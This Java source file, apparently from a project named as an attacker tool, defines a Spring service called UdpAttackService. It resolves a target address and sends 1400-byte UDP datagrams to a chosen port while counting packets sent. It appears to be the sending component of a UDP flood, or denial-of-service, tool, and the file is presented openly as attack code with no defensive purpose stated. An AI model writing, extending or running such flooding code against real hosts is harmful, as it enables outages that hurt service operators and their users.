package com.onzecincocincodoet.xarlreizattacker.service.impl;

import com.onzecincocincodoet.xarlreizattacker.service.AttackService;
import com.onzecincocincodoet.xarlreizattacker.util.NetworkUtils;
import org.springframework.stereotype.Service;

import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.util.concurrent.atomic.AtomicLong;

@Service
public class UdpAttackService implements AttackService {
    private final AtomicLong packetsSent = new AtomicLong(0);

    @Override
    public void sendPackets(String target, int port) {
        try (DatagramSocket socket = new DatagramSocket()) {
            byte[] data = new byte[1400];
            InetAddress address = NetworkUtils.resolveAddress(target);
            DatagramPacket packet = new DatagramPacket(data, data.length, address, port);
            socket.send(packet);
            packetsSent.incrementAndGet();
        } catch (Exception e) {
            throw new RuntimeException("Failed to send UDP packet", e);
        }
    }

    @Override
    public long getPacketsSent() {
        return packetsSent.get();
    }
}


